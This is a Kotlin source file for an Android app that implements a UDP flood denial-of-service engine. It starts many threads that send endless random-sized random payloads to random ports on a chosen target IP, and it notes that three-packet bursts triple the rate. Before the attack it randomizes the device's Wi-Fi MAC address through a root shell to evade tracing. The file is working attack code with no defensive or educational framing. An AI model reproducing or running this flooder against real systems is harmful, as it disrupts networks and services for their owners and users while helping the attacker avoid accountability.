package com.twks.wifi

import android.util.Log
import kotlinx.coroutines.*
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.util.concurrent.atomic.AtomicLong
import kotlin.random.Random

object FloodEngine {
    @Volatile private var isAttacking = false
    private val packetCount = AtomicLong(0)
    private val jobScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun startFlood(targetIp: String, threads: Int) {
        if (isAttacking) return
        isAttacking = true
        packetCount.set(0)

        RootShell.randomizeMac("wlan0")

        val address = try {
            InetAddress.getByName(targetIp)
        } catch (e: Exception) {
            Log.e("TWKS", "Invalid IP: $targetIp", e)
            return
        }

        for (i in 0 until threads) {
            jobScope.launch {
                var localCount = 0L
                var socket: DatagramSocket? = null
                try {
                    socket = DatagramSocket()
                    socket.reuseAddress = true
                    socket.sendBufferSize = 4194304
                    socket.trafficClass = 0x10

                    val random = Random(System.nanoTime() + i)

                    while (isAttacking) {
                        val len = random.nextInt(512, 1401)
                        val payload = ByteArray(len).apply { random.nextBytes(this) }
                        // залп из 3 пакетов за цикл: x3 к скорости без новых потоков
                        repeat(3) {
                            val port = random.nextInt(1024, 65535)
                            val packet = DatagramPacket(payload, payload.size, address, port)
                            socket.send(packet)
                            localCount++
                        }
                        if (localCount >= 1000) {
                            packetCount.addAndGet(localCount)
                            localCount = 0L
                        }
                    }
                } catch (e: Exception) {
                } finally {
                    packetCount.addAndGet(localCount)
                    socket?.close()
                }
            }
        }
    }

    fun stopFlood() {
        isAttacking = false
        jobScope.coroutineContext[Job]?.cancelChildren()
        RootShell.restoreMac("wlan0")
    }

    fun getPacketCount(): Long = packetCount.get()
}
